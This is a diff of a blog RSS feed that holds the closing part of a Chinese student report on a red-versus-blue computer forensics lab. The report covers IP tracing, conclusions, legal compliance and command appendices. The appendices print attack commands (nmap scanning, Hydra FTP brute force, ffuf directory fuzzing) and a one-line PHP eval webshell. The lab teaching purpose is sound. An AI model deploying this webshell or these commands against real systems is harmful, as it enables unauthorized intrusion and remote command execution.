+&lt;p&gt;&lt;img src=&#34;D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c22.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;35-ip-溯源分析&#34;&gt;3.5 IP 溯源分析
+&lt;/h2&gt;&lt;p&gt;IP 溯源通过查询攻击方 IP 地址的相关信息，定位攻击源头，为追踪攻击者提供线索。本次实训中红队使用内网 IP，通过模拟公网 IP 溯源场景完成分析。&lt;/p&gt;
+&lt;h3 id=&#34;351-公网-ip-获取&#34;&gt;3.5.1 公网 IP 获取
+&lt;/h3&gt;&lt;p&gt;红队将 Kali Linux 虚拟机网络模式改为 NAT 模式，通过终端执行 &lt;code&gt;curl ifconfig.me&lt;/code&gt; 命令，获取公网 IP 地址为 &lt;code&gt;119.133.5.47&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c23.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;352-威胁情报查询&#34;&gt;3.5.2 威胁情报查询
+&lt;/h3&gt;&lt;p&gt;蓝队访问微步在线威胁情报平台（https://x.threatbook.cn/），输入红队公网 IP &lt;code&gt;119.133.5.47&lt;/code&gt; 进行查询，结果如下：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c24.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c25.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c26.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;地理位置&lt;/strong&gt;：中国广东省江门市，运营商为中国电信，用户类型为住宅用户；&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;IP 特征&lt;/strong&gt;：动态 IP，近期存在少量扫描行为，包括访问敏感文件、端口扫描等；&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;关联信息&lt;/strong&gt;：该 IP 所属 C 段（119.133.5.0/24）存在 22 个恶意 IP，历史攻击记录显示该 IP 曾用于传播木马和端口扫描；&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;时间匹配&lt;/strong&gt;：情报更新时间为 2025 年 12 月 10 日，与本次实训攻击时间一致。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;353-溯源结论&#34;&gt;3.5.3 溯源结论
+&lt;/h3&gt;&lt;p&gt;结合 IP 查询结果和攻击行为特征，可确认 &lt;code&gt;119.133.5.47&lt;/code&gt; 为红队攻击时使用的公网 IP，该 IP 所属区域、运营商信息及历史行为均与本次攻击特征吻合，为攻击源头定位提供了关键线索。&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;第-4-章结论&#34;&gt;第 4 章　结论
+&lt;/h1&gt;&lt;h2 id=&#34;41-实训总结&#34;&gt;4.1 实训总结
+&lt;/h2&gt;&lt;p&gt;本次计算机取证技术实训基于红蓝攻防模式，成功完成了 Web 系统入侵取证的全流程实践。蓝队通过网络流量取证、系统日志分析、文件证据提取和 IP 溯源四大核心技术，构建了完整的证据链，全面还原了红队的攻击过程：红队首先通过 Nmap 端口扫描发现蓝队开放 80 和 21 端口，随后利用 Hydra 爆破 FTP 弱口令成功登录，通过 Ffuf 目录扫描找到 Dedecms 后台和 phpmyadmin 路径，最终通过 SQL 注入写入一句话木马，获取服务器控制权。&lt;/p&gt;
+&lt;p&gt;实训过程中，各取证技术相互印证：网络流量捕获了攻击的实时交互数据，系统日志记录了攻击的时间轨迹，文件证据提供了攻击的直接遗留物，IP 溯源定位了攻击的源头线索，形成了“行为捕获 - 轨迹验证 - 物证确认 - 源头定位”的完整取证闭环，达到了实训预期目标。&lt;/p&gt;
+&lt;h2 id=&#34;42-问题与解决方案&#34;&gt;4.2 问题与解决方案
+&lt;/h2&gt;&lt;p&gt;实训过程中遇到的主要问题及解决方案如下：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;虚拟机网络不通&lt;/strong&gt;：初始配置时红蓝双方无法 ping 通，排查发现是防火墙拦截，关闭双方防火墙后问题解决；&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;FTP 爆破失败&lt;/strong&gt;：因 Windows Server 2019 默认关闭 FTP 匿名登录，通过 IIS 管理器开启匿名身份验证并配置授权规则后，爆破成功；&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;PHP 文件无法解析&lt;/strong&gt;：IIS 服务器未配置 PHP 处理程序，通过添加 FastCGI 模块映射并重启 IIS 服务，成功解析 .php 文件；&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;SQL 写入 Shell 失败&lt;/strong&gt;：路径格式错误和文件夹权限不足导致，修正 SQL 语句中的路径转义格式，并为目标文件夹添加 NETWORK SERVICE 写入权限后，成功生成恶意文件。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;43-可行性分析&#34;&gt;4.3 可行性分析
+&lt;/h2&gt;&lt;p&gt;本次实训所采用的取证方案具备充分的技术可行性、环境可行性和操作可行性，具体分析如下：&lt;/p&gt;
+&lt;h3 id=&#34;431-技术可行性&#34;&gt;4.3.1 技术可行性
+&lt;/h3&gt;&lt;p&gt;本次实训选用的取证技术均为网络安全领域成熟且广泛应用的主流技术：
+网络流量取证依赖 Wireshark 工具，其具备强大的数据包捕获与过滤能力，可精准筛选攻击相关流量；
+日志分析采用 Log Parser Lizard 工具，适配 IIS 日志、Windows 安全日志等多种格式，查询效率与分析准确性经过实践验证；
+文件取证工具 Notepad++、WinHex 可满足恶意文件内容查看与属性分析需求；
+IP 溯源借助微步在线等权威威胁情报平台，数据来源可靠、查询结果精准。
+所有技术工具均具备完善的文档支持与社区资源，技术门槛符合实训场景要求，且各技术间可形成互补印证，确保取证流程的完整性与有效性。&lt;/p&gt;
+&lt;h3 id=&#34;432-环境可行性&#34;&gt;4.3.2 环境可行性
+&lt;/h3&gt;&lt;p&gt;实训基于 VMware Workstation 搭建虚拟化环境，红蓝双方虚拟机分别采用 Windows Server 2019 和 Kali Linux 操作系统，均为攻防实训的标准配置，兼容性强。网络规划采用 172.3.0.0/16 私有网段，设置“仅主机模式”避免外部网络干扰，同时通过 ping 测试验证了网络互通性，为攻防交互与取证数据捕获提供了稳定的网络环境。Web 系统选用存在明确漏洞的 Dedecms 5.7.118 版本，FTP 服务与 XAMPP 环境的配置流程清晰，可复现真实攻击场景，确保取证过程有明确的攻击行为可追溯、有完整的证据可提取。&lt;/p&gt;
+&lt;h3 id=&#34;433-操作可行性&#34;&gt;4.3.3 操作可行性
+&lt;/h3&gt;&lt;p&gt;实训团队分工明确，组长统筹协调，成员分别负责攻击实施、取证统筹、流量捕获与日志分析等核心环节，职责划分与技术能力匹配度高。实训步骤按“环境搭建 - 攻击实施 - 多维度取证 - 证据整合”逐步推进，每个环节均有明确的操作指南与验证标准，如网络连通性通过 ping 测试验证、攻击行为通过流量包确认、证据有效性通过时间戳与内容关联性佐证。针对实训中出现的网络不通、服务配置异常等问题，均能通过现有技术手段快速排查解决，未出现技术瓶颈或无法实现的操作环节，确保了整个取证流程的顺利推进。&lt;/p&gt;
+&lt;h2 id=&#34;44-信息安全相关法律法规运用&#34;&gt;4.4 信息安全相关法律法规运用
+&lt;/h2&gt;&lt;p&gt;计算机取证工作的核心前提是“合法合规”，本次实训严格遵循我国信息安全领域相关法律法规要求，将法律合规性贯穿取证全流程，具体运用如下：&lt;/p&gt;
+&lt;h3 id=&#34;441-核心法律法规依据&#34;&gt;4.4.1 核心法律法规依据
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;《中华人民共和国网络安全法》&lt;/strong&gt;：明确规定网络运营者应当按照规定留存相关网络日志不少于六个月，本次实训中蓝队全程留存 Windows 安全日志、IIS Web 日志及 Wireshark 流量文件，符合日志留存义务要求；同时该法禁止非法侵入他人网络、非法获取网络数据，红队模拟攻击仅在授权实训环境内进行，严格界定了操作边界，避免触碰法律红线。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;《中华人民共和国数据安全法》&lt;/strong&gt;：要求数据处理活动应当保证数据的真实性、完整性、可用性。本次实训中所有取证数据（流量包、日志文件、恶意文件）均原始保存，未进行篡改或删减，通过文件属性、时间戳等信息确保数据可追溯，符合数据安全保护要求。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;《中华人民共和国个人信息保护法》&lt;/strong&gt;：明确个人信息处理应当遵循合法、正当、必要原则。本次实训环境为纯模拟场景，未涉及任何真实个人信息，避免了个人信息泄露风险，符合个人信息保护的法律规定。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;《中华人民共和国刑事诉讼法》&lt;/strong&gt;：电子证据需满足“真实性、合法性、关联性”三大要件。本次实训中，流量包捕获过程全程记录、日志提取流程规范、恶意文件原始保存，所有证据均能对应攻击行为的时间、主体、操作内容，形成完整的证据链，符合电子证据的法定要求。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;442-实训中的合规性实践&#34;&gt;4.4.2 实训中的合规性实践
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;取证权限合规&lt;/strong&gt;：蓝队作为“授权防守方”，仅对实训指定的目标服务器（172.3.200.10）进行取证操作，未越权访问其他设备或网络资源，确保取证行为的合法性。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;证据收集合规&lt;/strong&gt;：所有证据均通过合法工具与正当手段获取，未采用侵入式、破坏性技术，如流量捕获通过网卡监听而非篡改网络设备配置，日志提取通过系统自带工具而非破解权限，避免因取证手段非法导致证据无效。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;证据保全合规&lt;/strong&gt;：对捕获的流量包（&lt;code&gt;Attack_traffic.pcap&lt;/code&gt;）、日志文件、恶意文件（&lt;code&gt;webshell.php&lt;/code&gt;）均进行原始备份与格式固定，同时记录证据获取的时间、地点、方式，形成证据保全清单，确保证据在后续分析与呈现过程中不被篡改，符合法律对电子证据保全的要求。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;45-展望&#34;&gt;4.5 展望
+&lt;/h2&gt;&lt;p&gt;通过本次实训，深入掌握了计算机取证的核心技术和工具使用方法，深刻认识到攻防对抗中证据留存的重要性，同时强化了法律合规意识与方案设计能力。未来可从以下方面进一步提升：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;技术拓展&lt;/strong&gt;：引入蜜罐技术构建诱捕环境，增强攻击痕迹的捕获能力；探索内存取证、区块链存证等新兴技术，丰富取证手段；&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;工具优化&lt;/strong&gt;：学习使用 ELK Stack 等日志分析平台，提高大规模日志的处理效率；尝试自动化取证脚本开发，提升取证流程的标准化与高效性；&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;合规深化&lt;/strong&gt;：结合更多典型案例，深入研究电子证据在司法实践中的应用标准，强化法律法规与取证实操的结合度，提升合规取证的专业性。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;附录&#34;&gt;附录
+&lt;/h1&gt;&lt;h2 id=&#34;红队攻击命令&#34;&gt;红队攻击命令
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;网络配置：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo nano /etc/network/interfaces   # 修改 IP
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo systemctl restart networking   # 重启网络
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;端口扫描：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nmap -sV -p 1-1000 172.3.200.10
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;FTP 爆破：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hydra -l anonymous -p anonymous ftp://172.3.200.10
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;目录扫描：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ffuf -u &amp;#34;http://172.3.200.10/dedecms/FUZZ&amp;#34; -w /usr/share/wordlists/dirb/common.txt -fc 404
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;公网 IP 获取：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl ifconfig.me
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;蓝队取证命令&#34;&gt;蓝队取证命令
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;网络连通性验证：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ping 172.3.200.20
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;IIS 日志查询（Log Parser Lizard 中执行）：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;SELECT date, time, c-ip, cs-method, cs-uri-stem 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;FROM &amp;#39;C:\xampp\apache\logs\access.log&amp;#39; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;WHERE c-ip = &amp;#39;172.3.200.20&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;防火墙配置（Linux 示例）：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;iptables -F                # 清除规则
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;iptables -P INPUT ACCEPT   # 设置默认策略
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;附录-b-关键配置文件内容&#34;&gt;附录 B 关键配置文件内容
+&lt;/h2&gt;&lt;h3 id=&#34;1-kali-linux-网络配置文件etcnetworkinterfaces&#34;&gt;1. Kali Linux 网络配置文件（&lt;code&gt;/etc/network/interfaces&lt;/code&gt;）
+&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;auto lo
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;iface lo inet loopback
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;auto eth0
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;iface eth0 inet static
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    address 172.3.200.20
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    netmask 255.255.0.0
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c27.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;2-一句话木马文件webshellphp&#34;&gt;2. 一句话木马文件（&lt;code&gt;webshell.php&lt;/code&gt;）
+&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;?php @eval($_POST[&amp;#34;cmd&amp;#34;]);?&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;D:%5cWorkSpace%5cHugoBlog%5cdev%5ccontent%5cpost%5c%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e6%8a%80%e6%9c%af%e5%ae%9e%e8%ae%ad%5cimages%5c28.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>CET4_Eassay(2025)</title>
         <link>https://charles-lin-cell.github.io/p/cet4_eassay2025/</link>
         <pubDate>Thu, 11 Dec 2025 20:05:34 +0800</pubDate>
